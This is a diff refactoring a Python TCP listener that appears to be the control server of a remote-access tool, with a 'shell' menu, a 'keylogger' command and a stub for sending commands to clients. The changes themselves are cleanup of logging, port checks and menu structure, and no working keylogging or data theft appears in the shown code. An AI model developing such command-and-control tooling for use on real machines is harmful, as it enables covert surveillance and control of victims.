@@ -35,20 +35,20 @@ def get_logger():
         raise ValueError(f"Invalid LOG_LEVEL: {log_level_str}")
     logger = logging.getLogger("logger")
     logger.setLevel(numeric_level)
-    console_handler = logging.StreamHandler()
-    console_handler.setLevel(numeric_level)
-    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
-    console_handler.setFormatter(formatter)
-    logger.addHandler(console_handler)
+    if not logger.hasHandlers():
+        console_handler = logging.StreamHandler()
+        console_handler.setLevel(numeric_level)
+        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+        console_handler.setFormatter(formatter)
+        logger.addHandler(console_handler)
     return logger
 logger = get_logger()
 
 # Load .env    
-load_dotenv()
-LHOST = getenv("LHOST","localLHOST")
-LPORT = getenv("LPORT","1911")
+LHOST = str(getenv("LHOST","localhost"))
+LPORT = int(getenv("LPORT", "1911"))
 RECV_SIZE = int(getenv("RECV_SIZE","1024"))
-ENCODING = str(getenv("ENCODE","utf-8"))
+ENCODING = str(getenv("ENCODING","utf-8"))
 OUT_FILE=str(getenv("OUT_FILE","output"))
 OUTPUT_FORMAT=str(getenv("OUTPUT_FORMAT","CLF")) # Options: CLF, JSON (to-do)
 """
@@ -121,25 +121,26 @@ def out_new_line(addr:str,
                 )
 
 # initialize server
-def start_server(LPORT=LPORT):
+def start_server(lport=LPORT):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
     try:
-        LPORT = int(LPORT)
+        lport = int(lport)
     except ValueError:
         logger.error("Invalid LPORT number. Please enter a valid integer.")
         return
-    if LPORT < 1024:
+    if lport < 1024:
         logger.warning("You must start the program as root to use LPORT 1024 and gold.")
         logger.warning("If the program does not work, change the LPORT number to a value greater than 1024.")
-    elif LPORT > 65535:
-        logger.error("Port number must lower then 65535")
-    server.bind((LHOST, LPORT))
+        return
+    elif lport > 65535:
+        logger.error("Port number must be lower than 65535")
+        return
+    server.bind((LHOST, lport))
     server.listen(5)
 
-    logger.info(f"\nTCP Server listening on {LHOST}:{LPORT}\n")
-
+    logger.info(f"\nTCP Server listening on {LHOST}:{lport}\n")
 
     try:
         while True:
@@ -155,7 +156,7 @@ def start_server(LPORT=LPORT):
 # terminal commands
 def terminal(args):
     def help_command():
-        logger.info("Available commands:", ", ".join(commands.keys()))
+        logger.info(f"Available commands: {', '.join(commands.keys())}")
 
     def keylogger_command():
         logger.info("keylogger started")
@@ -181,7 +182,7 @@ def terminal(args):
     if command:
         command()
     else:
-        logger.error("Invalid command. Available commands:", ", ".join(commands.keys()))
+        logger.error(f"Invalid command. Available commands: {', '.join(commands.keys())}")
                 
 # working on it
 def send_command_to_client(client_socket, command):
@@ -190,8 +191,7 @@ def send_command_to_client(client_socket, command):
     except Exception as e:
         logger.error(f"Failed to send command: {e}")
 
-if __name__ == "__main__":
-
+def main_menu():
     print(r"""
     
     ___          ___    _  _____
@@ -208,19 +208,28 @@ Type 'exit' to quit the server.
     listening_thread = threading.Thread(target=start_server, daemon=True)
     listening_thread.start()
 
-    while True:
-        menu_input = input()
-        if menu_input == "shell":
-            while True:
-                # Terminal input loop
-                try:
-                    user_command = input(f"\n{PROMPT}")
-                    if user_command == "back":
-                        terminal("back")
+    try:
+        while True:
+            menu_input = input()
+            if menu_input == "shell":
+                while True:
+                    # Terminal input loop
+                    try:
+                        user_command = input(f"\n{PROMPT}")
+                        if user_command == "back":
+                            terminal("back")
+                            break
+                        terminal(user_command)
+                    except KeyboardInterrupt:
+                        logger.info("\n[!] Interrupted. Exiting...")
                         break
-                    terminal(user_command)
-                except KeyboardInterrupt:
-                    logger.info("\n[!] Interrupted. Exiting...")
-                    break
-        elif menu_input == "exit":
-            terminal("exit")
+            elif menu_input == "exit":
+                terminal("exit")
+            else:
+                logger.error("Invalid command. Type 'shell' to enter the terminal interface or 'exit' to quit the server.")
+                continue
+    finally:
+        pass
+
+if __name__ == "__main__":
+    main_menu()
